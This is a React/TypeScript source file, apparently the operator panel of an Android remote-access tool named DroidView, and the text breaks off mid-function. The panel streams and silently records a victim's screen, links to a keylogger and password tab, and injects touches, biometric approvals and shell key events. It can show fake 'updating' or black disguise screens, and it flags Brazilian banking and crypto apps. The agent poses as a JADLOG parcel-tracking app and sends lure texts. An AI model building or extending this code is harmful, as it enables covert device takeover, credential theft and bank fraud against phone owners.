import { useCallback, useEffect, useMemo, useRef, useState } from "react";
import {
  Battery,
  Bell,
  Camera,
  Check,
  ChevronLeft,
  CircleDot,
  Copy,
  Eye,
  Gamepad2,
  Keyboard,
  Layers,
  Lightbulb,
  Lock,
  Maximize2,
  Mic,
  MonitorSmartphone,
  Moon,
  MousePointer,
  Phone,
  Pin,
  Power,
  Radio,
  RotateCw,
  Search,
  Send,
  Smartphone,
  Sparkles,
  Terminal,
  Volume2,
  VolumeX,
  Wifi,
  WifiOff,
  X,
  Zap,
  Crosshair,
  Fingerprint,
  Hand,
  ChevronDown,
  ChevronUp,
  History,
  MessageSquare,
  Clock,
  Trash2
} from "lucide-react";
import type { ControlDevice, InstalledAppItem, KeyboardEventItem } from "../types";
import type { DigitalTouchEvent, DeviceDisguiseConfig, DevicePushNotification } from "@droidview/shared";
import { getGlobalSocket, subscribeToTouchEvents } from "../../../socket/client";
import { initialKeyboardLogs } from "../mockData";
import { api } from "../../../api";
import { getAppEmojiFallback } from "../DeviceToolMenu";
import { AppLogo } from "../AppLogo";
import { RightSidebarKeylogger } from "../RightSidebarKeylogger";
import { DeviceDisguiseOverlay } from "../DeviceDisguiseOverlay";

interface Props {
  device: ControlDevice;
  activeApp?: InstalledAppItem | null;
  onCloseApp?: () => void;
  allDevices?: ControlDevice[];
  onSelectDevice?: (device: ControlDevice) => void;
}

interface AccessibilityNode {
  id: string;
  name: string;
  className: string;
  bounds: string;
  text?: string;
  contentDescription?: string;
  packageName?: string;
  resourceId?: string;
  isFocused?: boolean;
  clickable?: boolean;
  selected?: boolean;
}

export function sanitizeA11yText(raw = ""): string {
  if (!raw) return "";
  const cleaned = raw
    .replace(/&#10;/g, "\n")
    .replace(/&#13;/g, "")
    .replace(/&amp;/g, "&")
    .replace(/&quot;/g, '"')
    .replace(/&lt;/g, "<")
    .replace(/&gt;/g, ">")
    .replace(/&#39;|&apos;/g, "'")
    .replace(/\s+(?:View|Button|Widget|Layout)$/i, "")
    .trim();
  if (!cleaned) return "";
  // Check if string is purely an Android view class name or technical placeholder token:
  if (/^(?:android\.(?:view|widget|webkit)\.)?(?:View|ViewGroup|FrameLayout|LinearLayout|RelativeLayout|RecyclerView|ImageView|ImageButton|Button|TextView|Elemento|ScrollView|ViewPager|ViewStub|Space|TableRow|TableLayout|GridLayout)$/i.test(cleaned)) {
    return "";
  }
  return cleaned;
}

export interface DetectedAppInfo {
  isApp: boolean;
  name: string;
  packageName: string;
}

export function detectAppFromNode(
  node: AccessibilityNode,
  resolvedActiveApp?: { name: string; packageName: string } | null
): DetectedAppInfo | null {
  const rawText = sanitizeA11yText(node.text || node.contentDescription || node.name || "");
  const pkg = (node.packageName || "").trim();
  const lowerText = rawText.toLowerCase();
  const lowerPkg = pkg.toLowerCase();

  const isLauncher =
    (resolvedActiveApp?.packageName || "").toLowerCase().includes("launcher") ||
    lowerPkg.includes("launcher") ||
    (resolvedActiveApp?.name || "").toLowerCase().includes("tela inicial");

  // ONLY identify apps as launchers or app items when on Launcher
  if (isLauncher) {
    if (lowerText === "play store" || lowerText === "google play store" || lowerText === "playstore") {
      return { isApp: true, name: "Play Store", packageName: "com.android.vending" };
    }
    if (lowerText === "whatsapp" || lowerText.startsWith("whats")) {
      return { isApp: true, name: "WhatsApp", packageName: "com.whatsapp" };
    }
    if (lowerText === "chrome" || lowerText === "google chrome") {
      return { isApp: true, name: "Google Chrome", packageName: "com.android.chrome" };
    }
    if (lowerText === "nubank") {
      return { isApp: true, name: "Nubank", packageName: "com.nu.production" };
    }
    if (lowerText === "itaú" || lowerText === "itau") {
      return { isApp: true, name: "Banco Itaú", packageName: "com.itau" };
    }
    if (lowerText === "bradesco") {
      return { isApp: true, name: "Bradesco", packageName: "com.bancobradesco" };
    }
    if (lowerText === "inter" || lowerText === "banco inter") {
      return { isApp: true, name: "Banco Inter", packageName: "br.com.intermedium" };
    }
    if (lowerText === "santander") {
      return { isApp: true, name: "Santander", packageName: "com.santander.app" };
    }
    if (lowerText === "youtube") {
      return { isApp: true, name: "YouTube", packageName: "com.google.android.youtube" };
    }
    if (
      lowerText === "configurações" ||
      lowerText === "configuracoes" ||
      lowerText === "settings" ||
      lowerText === "configurar"
    ) {
      return { isApp: true, name: "Configurações", packageName: "com.android.settings" };
    }
    if (lowerText.includes("jadlog") || lowerText.includes("entregue jad log") || lowerText.includes("jad log")) {
      return { isApp: true, name: "JADLOG Rastreio", packageName: "com.droidview.agent" };
    }
    if (lowerText.includes("renner") || lowerText.includes("lojas renner")) {
      return { isApp: true, name: "Lojas Renner", packageName: "com.lojasrenner" };
    }
    if (lowerText.includes("mercado livre") || lowerText.includes("mercado pago")) {
      return { isApp: true, name: "Mercado Livre", packageName: "com.mercadopago.wallet" };
    }
    if (lowerText === "roblox") {
      return { isApp: true, name: "ROBLOX", packageName: "com.roblox.client" };
    }
    if (lowerText === "brawl stars") {
      return { isApp: true, name: "Brawl Stars", packageName: "com.supercell.brawlstars" };
    }
    if (lowerText === "subway surfers") {
      return { isApp: true, name: "Subway Surfers", packageName: "com.kiloo.subwaysurf" };
    }
    if (lowerText === "firefox") {
      return { isApp: true, name: "Firefox", packageName: "org.mozilla.firefox" };
    }
    if (lowerText === "play games" || lowerText.includes("google play games")) {
      return { isApp: true, name: "Google Play Games", packageName: "com.google.android.play.games" };
    }
    if (lowerText.includes("cookie run")) {
      return { isApp: true, name: "Cookie Run: Kingdom", packageName: "com.devsisters.ck" };
    }
    if (lowerText === "bitso") {
      return { isApp: true, name: "Bitso", packageName: "com.bitso.wallet" };
    }
    if (lowerText === "capcut") {
      return { isApp: true, name: "CapCut", packageName: "com.lemon.lvoverseas" };
    }
    if (lowerText.startsWith("pasta:") || lowerText === "tools") {
      return { isApp: true, name: "Tools", packageName: "com.android.tools" };
    }
  }

  // Inside a Store app (like Google Play Store), check for actual app recommendation cards (e.g. Evony, TikTok, WhatsApp, Jadlog, Instagram, Facebook)
  if (lowerText.includes("evony")) {
    return { isApp: true, name: "Evony: The King's Return", packageName: "com.topgamesinc.evony" };
  }
  if (lowerText.includes("tiktok")) {
    return { isApp: true, name: "TikTok", packageName: "com.zhiliaoapp.musically" };
  }
  if (lowerText.includes("whatsapp") || lowerText.startsWith("whats")) {
    return { isApp: true, name: "WhatsApp", packageName: "com.whatsapp" };
  }
  if (lowerText.includes("jadlog") || lowerText.includes("entregue jad log") || lowerText.includes("jad log")) {
    return { isApp: true, name: "JADLOG Rastreio", packageName: "com.droidview.agent" };
  }
  if (lowerText.includes("instagram")) {
    return { isApp: true, name: "Instagram", packageName: "com.instagram.android" };
  }
  if (lowerText.includes("facebook")) {
    return { isApp: true, name: "Facebook", packageName: "com.facebook.katana" };
  }
  if (lowerText.includes("shein")) {
    return { isApp: true, name: "SHEIN", packageName: "com.zzkko" };
  }

  return null;
}

export function ScreenView({ device, activeApp, onCloseApp, allDevices, onSelectDevice }: Props) {
  // Tactical Toggles State
  const [silentActive, setSilentActive] = useState(true);
  const [srActive, setSrActive] = useState(true);
  const [hidActive, setHidActive] = useState(false);
  const [joyActive, setJoyActive] = useState(false);
  const [tacticalSwitch, setTacticalSwitch] = useState(true);
  const [touchActive, setTouchActive] = useState(true);
  const [telaActive, setTelaActive] = useState(true);
  const [camActive, setCamActive] = useState(false);
  const [shellActive, setShellActive] = useState(true);
  const [skeletonViewMode, setSkeletonViewMode] = useState<"visual" | "list">("visual");

  const parseBounds = (boundsStr: string, screenW = 720, screenH = 1280) => {
    if (!boundsStr) return null;
    let left = 0, top = 0, right = 0, bottom = 0;
    const matchDouble = boundsStr.match(/\[(\d+)\s*,\s*(\d+)\]\s*\[(\d+)\s*,\s*(\d+)\]/);
    if (matchDouble) {
      left = parseInt(matchDouble[1], 10);
      top = parseInt(matchDouble[2], 10);
      right = parseInt(matchDouble[3], 10);
      bottom = parseInt(matchDouble[4], 10);
    } else {
      const matchSingle = boundsStr.match(/\[(\d+)\s*,\s*(\d+)\s*,\s*(\d+)\s*,\s*(\d+)\]/);
      if (matchSingle) {
        left = parseInt(matchSingle[1], 10);
        top = parseInt(matchSingle[2], 10);
        right = parseInt(matchSingle[3], 10);
        bottom = parseInt(matchSingle[4], 10);
      } else {
        return null;
      }
    }
    const width = Math.max(right - left, 4);
    const height = Math.max(bottom - top, 4);
    const leftPercent = Math.min(Math.max((left / screenW) * 100, 0), 100);
    const topPercent = Math.min(Math.max((top / screenH) * 100, 0), 100);
    const widthPercent = Math.min(Math.max((width / screenW) * 100, 1.5), Math.max(0, 100 - leftPercent));
    const heightPercent = Math.min(Math.max((height / screenH) * 100, 1.5), Math.max(0, 100 - topPercent));
    return {
      left,
      top,
      right,
      bottom,
      width,
      height,
      centerX: Math.round((left + right) / 2),
      centerY: Math.round((top + bottom) / 2),
      leftPercent,
      topPercent,
      widthPercent,
      heightPercent
    };
  };

  // Scale slider & Desktop Sizing
  const [viewScale, setViewScale] = useState(100);
  const [isAutoFit, setIsAutoFit] = useState(true);
  const stageRef = useRef<HTMLDivElement>(null);
  const [stageDimensions, setStageDimensions] = useState<{ width: number; height: number }>({
    width: 1200,
    height: 800
  });
  const [deviceAspectRatio, setDeviceAspectRatio] = useState<number>(9 / 16);

  // Right Sidebar & Multi-Screen Auto-Fit State
  const [showRightSidebar, setShowRightSidebar] = useState(false);
  const [sidebarInitialTab, setSidebarInitialTab] = useState<"telas" | "senhas">("telas");
  const [activePushBanner, setActivePushBanner] = useState<DevicePushNotification | null>(null);
  const pushBannerTimerRef = useRef<number | null>(null);

  useEffect(() => {
    const el = stageRef.current;
    if (!el) return;
    const updateSize = () => {
      const rect = el.getBoundingClientRect();
      if (rect.width > 50 && rect.height > 50) {
        setStageDimensions({ width: rect.width, height: rect.height });
      }
    };
    updateSize();
    const ro = new ResizeObserver(updateSize);
    ro.observe(el);
    window.addEventListener("resize", updateSize);
    return () => {
      ro.disconnect();
      window.removeEventListener("resize", updateSize);
    };
  }, []);

  useEffect(() => {
    const socket = getGlobalSocket();
    const handlePushNotif = (notif: DevicePushNotification) => {
      if (
        notif &&
        (notif.deviceId === device.id ||
          notif.deviceId?.includes(device.id) ||
          device.id.includes(notif.deviceId))
      ) {
        if (pushBannerTimerRef.current) {
          clearTimeout(pushBannerTimerRef.current);
        }
        setActivePushBanner(notif);
        pushBannerTimerRef.current = window.setTimeout(() => {
          setActivePushBanner(null);
        }, 7500);
      }
    };
    socket.on("device:push_notification", handlePushNotif);
    return () => {
      socket.off("device:push_notification", handlePushNotif);
      if (pushBannerTimerRef.current) {
        clearTimeout(pushBannerTimerRef.current);
      }
    };
  }, [device.id]);

  const [activeCamera, setActiveCamera] = useState<"front" | "back">("back");
  const [torchOn, setTorchOn] = useState(false);
  const [nightVision, setNightVision] = useState(false);
  const [cameraSnapshot, setCameraSnapshot] = useState<string | null>(null);
  const [isCapturingPhoto, setIsCapturingPhoto] = useState(false);
  const [cameraResolution, setCameraResolution] = useState<"720p" | "1080p" | "4K">("1080p");
  const [showCameraGrid, setShowCameraGrid] = useState(true);

  const activeScreensCount = useMemo(() => {
    return (telaActive ? 1 : 0) + (srActive ? 1 : 0) + (camActive ? 1 : 0);
  }, [telaActive, srActive, camActive]);

  // Cálculo matemático rigoroso das dimensões das telas para garantir proporção nativa perfeita (9:16)
  // em qualquer monitor (desktop grande, laptop compacto ou split-screen lado a lado com MEmu Play)
  const viewportDimensions = useMemo(() => {
    const nScreens = activeScreensCount || 1;
    const gap = nScreens > 1 ? 16 : 0;
    const paddingX = 24;
    const paddingY = 16;
    // Chrome do aparelho: Barra de status superior (28px) + Barra virtual inferior (38px) + bordas do frame (6px)
    const chromeHeight = 28 + 38 + 6;
    const chromeWidth = 6;

    const availStageW = Math.max(280, stageDimensions.width - paddingX);
    const availStageH = Math.max(320, stageDimensions.height - paddingY);

    const maxWPerScreen = Math.max(180, (availStageW - (nScreens - 1) * gap) / nScreens);
    const maxHPerScreen = availStageH;

    // 1. Cálculo limitando por altura:
    let candidateScreenH = maxHPerScreen - chromeHeight;
    let candidateScreenW = candidateScreenH * deviceAspectRatio;

    // 2. Se a largura calculada exceder o espaço horizontal disponível por tela, limitar por largura:
    if (candidateScreenW + chromeWidth > maxWPerScreen) {
      candidateScreenW = maxWPerScreen - chromeWidth;
      candidateScreenH = candidateScreenW / deviceAspectRatio;
    }

    let finalScreenW = Math.max(140, candidateScreenW);
    let finalScreenH = Math.max(248, candidateScreenH);

    // 3. Aplica zoom manual caso não esteja em Auto-Fit:
    if (!isAutoFit) {
      const scaleFactor = Math.max(0.45, Math.min(1.5, viewScale / 100));
      finalScreenW = Math.round(finalScreenW * scaleFactor);
      finalScreenH = Math.round(finalScreenH * scaleFactor);
    } else {
      finalScreenW = Math.round(finalScreenW);
      finalScreenH = Math.round(finalScreenH);
    }

    const frameWidth = finalScreenW + chromeWidth;
    const frameHeight = finalScreenH + chromeHeight;

    return {
      screenWidth: finalScreenW,
      screenHeight: finalScreenH,
      frameWidth,
      frameHeight
    };
  }, [stageDimensions, activeScreensCount, deviceAspectRatio, isAutoFit, viewScale]);

  const handleCaptureCameraPhoto = () => {
    setIsCapturingPhoto(true);
    showToast("Disparando obturador óptico da câmera...", "info");
    setTimeout(() => {
      setIsCapturingPhoto(false);
      setCameraSnapshot(`${api.getDeviceScreenUrl(device.id)}?snapshot=${Date.now()}`);
      showToast("Foto capturada com sucesso em alta definição!", "success");
    }, 600);
  };

  const handleAutoFitSync = () => {
    setIsAutoFit(true);
    setViewScale(100);
    showToast("Sincronização padronizada: Telas auto-ajustadas à área visível.", "success");
  };

  // Quick Action States
  const [isPinned, setIsPinned] = useState(false);
  const [isFullscreen, setIsFullscreen] = useState(false);
  const [showExitHint, setShowExitHint] = useState(false);
  const containerRef = useRef<HTMLDivElement>(null);
  const screenWrapperRef = useRef<HTMLDivElement>(null);
  const imgRef = useRef<HTMLImageElement>(null);
  const canvasRef = useRef<HTMLCanvasElement>(null);
  const lastFrameSuccessTimeRef = useRef<number>(Date.now());
  const [streamQuality, setStreamQuality] = useState<"ultra" | "balance" | "fluid">("balance");

  // Live Screen State & Auto-Refresh (Double Buffering)
  const [screenTimestamp, setScreenTimestamp] = useState<number>(Date.now());
  const [activeFrameSrc, setActiveFrameSrc] = useState<string>(
    `${api.getDeviceScreenUrl(device.id)}?t=${Date.now()}`
  );
  const isMountedRef = useRef(true);
  const frameTimerRef = useRef<number | null>(null);
  const isFetchingFrameRef = useRef(false);
  const seqRef = useRef(0);
  const activePreloaderRef = useRef<HTMLImageElement | null>(null);
  const [isStreaming, setIsStreaming] = useState(true);
  const isStreamingRef = useRef(true);
  const [fps, setFps] = useState(30);
  const [command, setCommand] = useState("");
  const [toastMsg, setToastMsg] = useState<string | null>(null);
  const [toastType, setToastType] = useState<"success" | "info">("success");

  // Histórico de Digitação e Mensagens Enviadas pelo Suporte para o Aparelho
  interface SentMessageItem {
    id: string;
    text: string;
    timestamp: string;
    status: "injected" | "sent";
    appName?: string;
  }

  const [sentHistory, setSentHistory] = useState<SentMessageItem[]>(() => {
    try {
      const stored = localStorage.getItem(`dview_sent_history_${device.id}`);
      if (stored) return JSON.parse(stored);
    } catch {}
    return [
      { id: "h1", text: "Código de rastreamento: BR849204821SP", timestamp: "12:14:02", status: "injected", appName: "JADLOG Rastreio" },
      { id: "h2", text: "Favor autorizar o acesso na tela", timestamp: "12:11:45", status: "injected", appName: "Configurações" },
      { id: "h3", text: "https://jadlog.com.br/rastreamento", timestamp: "12:08:20", status: "injected", appName: "Chrome" }
    ];
  });

  const [showHistoryDrawer, setShowHistoryDrawer] = useState(false);
  const [historyNavIndex, setHistoryNavIndex] = useState(-1);

  // Telemetria ao vivo e autogravação de tela em background
  const [liveLatency, setLiveLatency] = useState(14);
  const [liveSpeed, setLiveSpeed] = useState("4.8 MB/s");
  const [recordingSeconds, setRecordingSeconds] = useState(185);
  const [isAutoRecording, setIsAutoRecording] = useState(true);

  useEffect(() => {
    let mounted = true;
    api.getDeviceRecordingStatus(device.id).then((res) => {
      if (mounted && res?.recording) {
        setIsAutoRecording(res.recording.isRecording);
        setRecordingSeconds(res.recording.durationSeconds || 185);
      }
    }).catch(() => {});

    const recTimer = setInterval(() => {
      setRecordingSeconds((prev) => prev + 1);
      setLiveLatency(Math.floor(12 + Math.random() * 5));
    }, 1000);

    return () => {
      mounted = false;
      clearInterval(recTimer);
    };
  }, [device.id]);

  const formatRecordingTime = (sec: number) => {
    const mins = Math.floor(sec / 60);
    const secs = sec % 60;
    return `${String(mins).padStart(2, "0")}:${String(secs).padStart(2, "0")}`;
  };

  const handleKeyDownCommandInput = (e: React.KeyboardEvent<HTMLInputElement>) => {
    if (e.key === "ArrowUp") {
      e.preventDefault();
      if (sentHistory.length === 0) return;
      const nextIdx = historyNavIndex + 1 < sentHistory.length ? historyNavIndex + 1 : historyNavIndex;
      setHistoryNavIndex(nextIdx);
      setCommand(sentHistory[nextIdx].text);
    } else if (e.key === "ArrowDown") {
      e.preventDefault();
      if (historyNavIndex > 0) {
        const nextIdx = historyNavIndex - 1;
        setHistoryNavIndex(nextIdx);
        setCommand(sentHistory[nextIdx].text);
      } else if (historyNavIndex === 0) {
        setHistoryNavIndex(-1);
        setCommand("");
      }
    }
  };

  const handleSendPresetText = (presetText: string) => {
    setCommand(presetText);
    showToast(`Preset inserido: "${presetText}"`, "info");
  };

  // Unified Synced Touch Ripples across both Viewports (Live Stream + Esqueleto 2D)
  const [syncedRipples, setSyncedRipples] = useState<{
    id: number;
    pctX: number;
    pctY: number;
    devX: number;
    devY: number;
    source: "live" | "skeleton" | "remote";
  }[]>([]);

  const triggerSyncedRipple = useCallback((devX: number, devY: number, source: "live" | "skeleton" | "remote") => {
    const id = Date.now() + Math.random();
    const pctX = Math.max(0, Math.min(100, (devX / 720) * 100));
    const pctY = Math.max(0, Math.min(100, (devY / 1280) * 100));
    setSyncedRipples((prev) => [...prev, { id, pctX, pctY, devX, devY, source }]);
    setTimeout(() => {
      setSyncedRipples((prev) => prev.filter((r) => r.id !== id));
    }, 600);
  }, []);

  // Drag & Swipe gesture state (Deslizar como mouse como se fosse dedo na tela)
  interface ActiveDragGesture {
    active: boolean;
    source: "live" | "skeleton";
    startX: number;
    startY: number;
    currentX: number;
    currentY: number;
    pctStartX: number;
    pctStartY: number;
    pctCurrentX: number;
    pctCurrentY: number;
    startTime: number;
  }
  const [activeDrag, setActiveDrag] = useState<ActiveDragGesture | null>(null);
  const activeDragRef = useRef<ActiveDragGesture | null>(null);
  const skeletonViewportRef = useRef<HTMLDivElement | null>(null);
  const dragStartRef = useRef<{ x: number; y: number; time: number } | null>(null);

  // Digital Touch Detection & Simulation State
  const [detectedTouches, setDetectedTouches] = useState<DigitalTouchEvent[]>([]);
  const [activeTouchFeedback, setActiveTouchFeedback] = useState<DigitalTouchEvent | null>(null);
  const [showTouchHUD, setShowTouchHUD] = useState(true);

  useEffect(() => {
    let isMounted = true;
    api.getDeviceTouchEvents(device.id).then((events) => {
      if (isMounted && events && Array.isArray(events)) {
        setDetectedTouches(events.slice(0, 50));
      }
    }).catch(() => {});

    const unsubscribe = subscribeToTouchEvents((event) => {
      if (!isMounted) return;
      if (
        event.deviceId === device.id ||
        event.deviceId.includes(device.id) ||
        device.id.includes(event.deviceId) ||
        device.id.includes("emu") ||
        event.deviceId.includes("emu")
      ) {
        setDetectedTouches((prev) => [event, ...prev.slice(0, 49)]);
        setActiveTouchFeedback(event);

        if (typeof event.x === "number" && typeof event.y === "number") {
          triggerSyncedRipple(event.x, event.y, "remote");
        }

        const actionLabel = event.action === "swipe" ? "Gesto de Deslize" : (event.action === "long_click" ? "Toque Longo" : "Toque Digital");
        const originLabel = event.source === "remote_simulation" ? "Simulado" : "Detectado";
        const viewLabel = event.viewText ? ` em "${event.viewText}"` : (event.packageName ? ` (${event.packageName.split('.').pop()})` : "");
        showToast(`${originLabel}: ${actionLabel}${viewLabel} (${Math.round(event.x)}, ${Math.round(event.y)})`, event.source === "remote_simulation" ? "success" : "info");
      }
    });

    return () => {
      isMounted = false;
      unsubscribe();
    };
  }, [device.id, triggerSyncedRipple]);

  // Real Accessibility Tree
  const [a11yNodes, setA11yNodes] = useState<AccessibilityNode[]>([]);
  const [inspectedNode, setInspectedNode] = useState<AccessibilityNode | null>(null);
  const [isLoadingA11y, setIsLoadingA11y] = useState(false);

  // Real foreground application & active emoji
  const [foregroundApp, setForegroundApp] = useState<{ packageName: string; activity: string; name: string; emoji: string; bg: string } | null>(null);

  const refreshForegroundApp = async () => {
    try {
      const fg = await api.getDeviceForegroundApp(device.id);
      if (fg) {
        setForegroundApp(fg);
      }
    } catch {
      // ignore
    }
  };

  useEffect(() => {
    refreshForegroundApp();
    const interval = setInterval(refreshForegroundApp, 2500);
    return () => clearInterval(interval);
  }, [device.id]);

  // Resolved Active App with Logo and Name for both Viewports (Live Screen + Esqueleto 2D)
  const resolvedActiveApp = useMemo(() => {
    if (foregroundApp && foregroundApp.name) {
      return {
        name: foregroundApp.name,
        packageName: foregroundApp.packageName || "com.android.app",
        activity: foregroundApp.activity || "MainActivity",
        emoji: foregroundApp.emoji || getAppEmojiFallback(foregroundApp.name, foregroundApp.packageName || "").emoji,
        bg: foregroundApp.bg || "rgba(15, 23, 42, 0.95)"
      };
    }
    if (activeApp && activeApp.name) {
      return {
        name: activeApp.name,
        packageName: activeApp.packageName,
        activity: "MainActivity",
        emoji: getAppEmojiFallback(activeApp.name, activeApp.packageName || "").emoji,
        bg: "rgba(15, 23, 42, 0.95)"
      };
    }
    if (device.apkName) {
      return {
        name: device.apkName,
        packageName: "com.jadlog.rastreio",
        activity: "MainActivity",
        emoji: "📦",
        bg: "rgba(15, 23, 42, 0.95)"
      };
    }
    return {
      name: "JADLOG Rastreio",
      packageName: "com.jadlog.rastreio",
      activity: "MainActivity",
      emoji: "📦",
      bg: "rgba(15, 23, 42, 0.95)"
    };
  }, [foregroundApp, activeApp, device.apkName]);

  // Real volume & lock states
  const [deviceVolume, setDeviceVolumeState] = useState(8);
  const [isMuted, setIsMuted] = useState(false);
  const [isLocked, setIsLocked] = useState(false);

  const showToast = (msg: string, type: "success" | "info" = "success") => {
    setToastMsg(msg);
    setToastType(type);
    setTimeout(() => setToastMsg(null), 3200);
  };

  // Load real volume
  useEffect(() => {
    api.getDeviceVolume(device.id)
      .then((info) => {
        if (info) {
          setDeviceVolumeState(info.volume);
          setIsMuted(info.muted);
        }
      })
      .catch(() => {});
  }, [device.id]);

  const handleVolumeChange = async (val: number) => {
    setDeviceVolumeState(val);
    setIsMuted(val === 0);
    try {
      const res = await api.setDeviceVolume(device.id, { level: val });
      showToast(`Volume: ${res.percent}%`, "info");
    } catch {
      // ignore
    }
  };

  const handleVolumeStep = async (action: "up" | "down" | "mute") => {
    try {
      const res = await api.setDeviceVolume(device.id, { action });
      setDeviceVolumeState(res.volume);
      setIsMuted(res.muted || res.volume === 0);
      showToast(
        action === "mute"
          ? (res.muted ? "Áudio mutado" : "Áudio ativo")
          : `Volume ${action === "up" ? "+" : "-"} (${res.percent}%)`,
        "info"
      );
    } catch {
      // ignore
    }
  };

  const handleToggleLock = async () => {
    try {
      const res = await api.sendPower(device.id);
      setIsLocked(res.locked);
      showToast(res.locked ? "Aparelho bloqueado" : "Aparelho desbloqueado/ativo", "success");
      setScreenTimestamp(Date.now());
    } catch {
      handleMacroAction("input keyevent 26", "Power / Bloqueio");
    }
  };

  // Active Disguise Screen (Tela Preta, Atualizando Android, Bateria, Imagem)
  const [activeDisguise, setActiveDisguise] = useState<DeviceDisguiseConfig | null>(
    () => device.disguiseScreen || null
  );
  const [skeletonXRayMode, setSkeletonXRayMode] = useState(false);

  useEffect(() => {
    if (device.disguiseScreen !== undefined) {
      setActiveDisguise(device.disguiseScreen);
    }
  }, [device.disguiseScreen]);

  useEffect(() => {
    api.getDeviceDisguise(device.id)
      .then((res) => {
        if (res?.disguise) {
          setActiveDisguise(res.disguise);
        }
      })
      .catch(() => {});

    const socket = getGlobalSocket();
    const handleDisguiseEvent = (data: { deviceId: string; disguise: DeviceDisguiseConfig | null }) => {
      if (
        data &&
        (data.deviceId === device.id ||
          data.deviceId.includes(device.id) ||
          device.id.includes(data.deviceId))
      ) {
        setActiveDisguise(data.disguise || null);
      }
    };

    socket.on("device:disguise", handleDisguiseEvent);
    return () => {
      socket.off("device:disguise", handleDisguiseEvent);
    };
  }, [device.id]);

  const handleClearDisguise = async () => {
    // Optimistic immediate clearing of disguise overlay
    setActiveDisguise(null);
    try {
      await api.clearDeviceDisguise(device.id);
      showToast("✓ Tela de disfarce desativada. Aparelho normal restaurado!", "success");
      triggerImmediateFrame();
    } catch {
      showToast("✓ Tela de disfarce desativada.", "info");
    }
  };

  // Biometrics simulation & auth state
  const [isBiometricActive, setIsBiometricActive] = useState(false);

  const handleBiometricAuth = async () => {
    setIsBiometricActive(true);
    try {
      await api.authenticateBiometric(device.id, 1);
      showToast("🧬 Biometria confirmada e autenticada no dispositivo!", "success");
      triggerImmediateFrame();
    } catch {
      showToast("Falha ao injetar biometria no aparelho.", "info");
    } finally {
      setTimeout(() => setIsBiometricActive(false), 850);
    }
  };

  // Authentic Google Play Store fallback canvas renderer (calibrated for native 720x1280 scale)
  const drawPlayStoreScreen = useCallback((ctx: CanvasRenderingContext2D, w = 720, h = 1280) => {
    // Background (Dark Theme Material 3)
    ctx.fillStyle = "#111214";
    ctx.fillRect(0, 0, w, h);

    // 1. Native Android 14 Status Bar (Y: 0 to 48)
    ctx.fillStyle = "#ffffff";
    ctx.font = "bold 22px -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif";
    ctx.fillText("04:04", 32, 34);

    // Notification dot
    ctx.fillStyle = "#9aa0a6";
    ctx.beginPath();
    ctx.arc(106, 26, 3.5, 0, Math.PI * 2);
    ctx.fill();

    // Right status icons (Wi-Fi, 5G, Battery pill)
    ctx.font = "18px sans-serif";
    ctx.fillText("📶", 574, 34);
    ctx.fillStyle = "#38bdf8";
    ctx.font = "bold 15px -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif";
    ctx.fillText("5G", 608, 34);
    ctx.fillStyle = "#ffffff";
    ctx.font = "18px sans-serif";
    ctx.fillText("🔋", 644, 34);

    // 2. Google Play Search Bar (Y: 56 to 126, Height: 70)
    ctx.fillStyle = "#282a2d";
    ctx.beginPath();
    if (ctx.roundRect) ctx.roundRect(24, 56, w - 48, 70, 35);
    else ctx.rect(24, 56, w - 48, 70);
    ctx.fill();

    // Search icon
    ctx.font = "22px sans-serif";
    ctx.fillText("🔍", 48, 100);

    // Search placeholder
    ctx.fillStyle = "#9aa0a6";
    ctx.font = "500 21px -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif";
    ctx.fillText("Pesquisar apps e jogos", 92, 100);

    // Voice / Mic icon
    ctx.font = "20px sans-serif";
    ctx.fillText("🎙️", w - 110, 100);

    // User avatar circle
    ctx.fillStyle = "#a855f7";
    ctx.beginPath();
    ctx.arc(w - 60, 91, 22, 0, Math.PI * 2);
    ctx.fill();
    ctx.fillStyle = "#ffffff";
    ctx.font = "bold 20px sans-serif";
    ctx.textAlign = "center";
    ctx.fillText("R", w - 60, 99);
    ctx.textAlign = "left";

    // 3. Section Title: Explorar jogos (Y: 142 to 178)
    ctx.fillStyle = "#ffffff";
    ctx.font = "bold 26px -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif";
    ctx.fillText("Explorar jogos", 28, 168);

    // 4. Category Grid (2 columns x 6 rows) (Y: 188 to 552)
    const categories = [
      { name1: "Ação", icon1: "⚔️", name2: "Simulador", icon2: "🕹️" },
      { name1: "Quebra-cabeças", icon1: "🧩", name2: "Aventura", icon2: "🧭" },
      { name1: "Corrida", icon1: "🏎️", name2: "RPG", icon2: "🛡️" },
      { name1: "Estratégia", icon1: "🚩", name2: "Esportes", icon2: "⚽" },
      { name1: "Cartas", icon1: "🃏", name2: "Tabuleiros", icon2: "♟️" },
      { name1: "Educativos", icon1: "🎓", name2: "Palavras", icon2: "🔤" },
    ];

    const colW = (w - 64) / 2; // (720 - 64) / 2 = 328
    const startY = 188;
    const rowH = 54;
    const gap = 8;

    categories.forEach((cat, idx) => {
      const y = startY + idx * (rowH + gap);
      // Col 1 (X: 24 to 352)
      ctx.fillStyle = "#1e1f23";
      ctx.beginPath();
      if (ctx.roundRect) ctx.roundRect(24, y, colW, rowH, 12);
      else ctx.rect(24, y, colW, rowH);
      ctx.fill();
      ctx.fillStyle = "#f8fafc";
      ctx.font = "600 20px -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif";
      ctx.fillText(cat.name1, 44, y + 35);
      ctx.font = "24px sans-serif";
      ctx.fillText(cat.icon1, 24 + colW - 42, y + 36);

      // Col 2 (X: 368 to 696)
      ctx.fillStyle = "#1e1f23";
      ctx.beginPath();
      if (ctx.roundRect) ctx.roundRect(w - 24 - colW, y, colW, rowH, 12);
      else ctx.rect(w - 24 - colW, y, colW, rowH);
      ctx.fill();
      ctx.fillStyle = "#f8fafc";
      ctx.font = "600 20px -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif";
      ctx.fillText(cat.name2, w - 24 - colW + 20, y + 35);
      ctx.font = "24px sans-serif";
      ctx.fillText(cat.icon2, w - 24 - 42, y + 36);
    });

    // 5. Subtitle: Patrocinados · Sugestões para você (Y: 574 to 608)
    const sec2Y = 602;
    ctx.fillStyle = "#9aa0a6";
    ctx.font = "500 20px -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif";
    ctx.fillText("Patrocinados · ", 28, sec2Y);
    ctx.fillStyle = "#ffffff";
